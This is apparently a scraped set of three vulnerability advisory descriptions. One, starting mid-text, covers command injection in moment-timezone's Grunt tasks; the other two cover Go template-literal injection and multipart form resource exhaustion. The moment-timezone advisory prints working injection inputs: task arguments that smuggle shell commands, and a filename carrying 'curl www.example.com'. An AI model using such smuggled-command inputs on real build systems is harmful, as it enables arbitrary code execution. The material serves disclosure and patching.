Download data from iana.org/time-zones.\u0026#39;, function (version) {\n8          version = version || \u0026#39;latest\u0026#39;;\n\n10          var done  = this.async(),\n11              src   = \u0026#39;ftp://ftp.iana.org/tz/tzdata-latest.tar.gz\u0026#39;,\n12              curl  = path.resolve(\u0026#39;temp/curl\u0026#39;, version, \u0026#39;data.tar.gz\u0026#39;),\n13              dest  = path.resolve(\u0026#39;temp/download\u0026#39;, version);\n...\n24          exec(\u0026#39;curl \u0026#39; + src + \u0026#39; -o \u0026#39; + curl + \u0026#39; \u0026amp;\u0026amp; cd \u0026#39; + dest + \u0026#39; \u0026amp;\u0026amp; gzip -dc \u0026#39; + curl + \u0026#39; | tar -xf -\u0026#39;, function (err) {\n```\n\nOrdinarily, one one run this script using something like `grunt data-download:2014d`, in which case version would have the value `2014d`. However, if an attacker were to provide additional content on the command line, they would be able to execute arbitrary code\n\n```\nroot@e94ba0490b65:/usr/src/app/moment-timezone# grunt \u0026#39;data-download:2014d ; echo flag\u0026gt;/tmp/foo #\u0026#39;\n\\Running \u0026#34;data-download:2014d ; echo flag\u0026gt;/tmp/foo #\u0026#34; (data-download) task\n\u0026gt;\u0026gt; Downloading https://data.iana.org/time-zones/releases/tzdata2014d ; echo flag\u0026gt;/tmp/foo #.tar.gz\n\u0026gt;\u0026gt; Downloaded https://data.iana.org/time-zones/releases/tzdata2014d ; echo flag\u0026gt;/tmp/foo #.tar.gz\n\nDone.\nroot@e94ba0490b65:/usr/src/app/moment-timezone# cat /tmp/foo\nflag\n```\n\n#### Command Injection via data-zdump.js\n\nThe `tasks/data-zdump.js` script reads a list of files present in a temporary directory (created by previous tasks), and for each one, assembles and executes a command line without sanitization. As a result, an attacker able to influence the contents of that directory could gain code execution. This attack is exacerbated by timezone data being downloaded via cleartext FTP (described above), but beyond that, an attacker at iana.org able to modify the timezone files could disrupt any systems that build moment-timezone.\n\n```\n15              files     = grunt.file.expand({ filter : \u0026#39;isFile\u0026#39;, cwd : \u0026#39;temp/zic/\u0026#39; + version }, \u0026#39;**/*\u0026#39;);\n...\n27          function next () {\n...\n33              var file = files.pop(),\n34                  src  = path.join(zicBase, file),\n35                  dest = path.join(zdumpBase, file);\n36              exec(\u0026#39;zdump -v \u0026#39; + src, { maxBuffer: 20*1024*1024 }, function (err, stdout) {\n```\n\nIn this case, an attacker able to add a file to `temp/zic/2014d` (for example) with a filename like `Z; curl www.example.com` would influence the called to exec on line 36 and run arbitrary code. There are a few minor challenges in exploiting this, since the string needs to be a valid filename.\n\n#### Command Injection via data-zic.js\n\nSimilar to the vulnerability in /tasks/data-download.js, the /tasks/data-zic.js script takes a version from the command line and uses it as part of a command line, executed without sanitization.\n\n```\n10          var done  = this.async(),\n11              dest  = path.resolve(\u0026#39;temp/zic\u0026#39;, version),\n...\n22              var file = files.shift(),\n23                  src = path.resolve(\u0026#39;temp/download\u0026#39;, version, file);\n24\n25              exec(\u0026#39;zic -d \u0026#39; + dest + \u0026#39; \u0026#39; + src, function (err) {\n```\n\nAs a result, an attacker able to influence that string can run arbitrary commands. Of course, it requires an attacker able to influence the command passed to grunt, so may be unlikely in practice.\n\n```\nroot@e94ba0490b65:/usr/src/app/moment-timezone# grunt \u0026#39;data-zic:2014d; echo hi \u0026gt; /tmp/evil; echo \u0026#39;\nRunning \u0026#34;data-zic:2014d; echo hi \u0026gt; /tmp/evil; echo \u0026#34; (data-zic) task\nexec: zid -d /usr/src/app/moment-timezone/temp/zic/2014d; echo hi \u0026gt; /tmp/evil; echo  /usr/src/app/moment-timezone/temp/download/2014d; echo hi \u0026gt; /tmp/evil; echo /africa\n...\n\nroot@e94ba0490b65:/usr/src/app/moment-timezone# cat /tmp/evil\nhi\n```\n\n### Patches\n\nThe supplied patch on top of 0.5.34 is applicable with minor tweaks to all affected versions. It switches `exec` to `execFile` so arbitrary bash fragments won\u0026#39;t be executed any more.\n\n### References\n\n* https://knowledge-base.secureflag.com/vulnerabilities/code_injection/os_command_injection_nodejs.html\n* https://auth0.com/blog/preventing-command-injection-attacks-in-node-js-apps/"

If a template contains a Go template action within a Javascript template literal, the contents of the action can be used to terminate the literal, injecting arbitrary Javascript code into the Go template. As ES6 template literals are rather complex, and themselves can do string interpolation, the decision was made to simply disallow Go template actions from being used inside of them (e.g. \u0026#34;var a = {{.}}\u0026#34;), since there is no obviously safe way to allow this behavior. This takes the same approach as github.com/google/safehtml. With fix, Template.Parse returns an Error when it encounters templates like this, with an ErrorCode of value 12. This ErrorCode is currently unexported, but will be exported in the release of Go 1.21. Users who rely on the previous behavior can re-enable it using the GODEBUG flag jstmpllitinterp=1, with the caveat that backticks will now be escaped. This should be used with caution."

Multipart form parsing with mime/multipart.Reader.ReadForm can consume largely unlimited amounts of memory and disk files. This also affects form parsing in the net/http package with the Request methods FormFile, FormValue, ParseMultipartForm, and PostFormValue. ReadForm takes a maxMemory parameter, and is documented as storing \"up to maxMemory bytes +10MB (reserved for non-file parts) in memory\". File parts which cannot be stored in memory are stored on disk in temporary files. The unconfigurable 10MB reserved for non-file parts is excessively large and can potentially open a denial of service vector on its own. However, ReadForm did not properly account for all memory consumed by a parsed form, such as map entry overhead, part names, and MIME headers, permitting a maliciously crafted form to consume well over 10MB. In addition, ReadForm contained no limit on the number of disk files created, permitting a relatively small request body to create a large number of disk temporary files. With fix, ReadForm now properly accounts for various forms of memory overhead, and should now stay within its documented limit of 10MB + maxMemory bytes of memory consumption. Users should still be aware that this limit is high and may still be hazardous. In addition, ReadForm now creates at most one on-disk temporary file, combining multiple form parts into a single temporary file. The mime/multipart.File interface type's documentation states, \"If stored on disk, the File's underlying concrete type will be an *os.File.\". This is no longer the case when a form contains more than one file part, due to this coalescing of parts into a single file. The previous behavior of using distinct files for each form part may be reenabled with the environment variable GODEBUG=multipartfiles=distinct. Users should be aware that multipart.ReadForm and the http.Request methods that call it do not limit the amount of disk consumed by temporary files. Callers can limit the size of form data with http.MaxBytesReader."
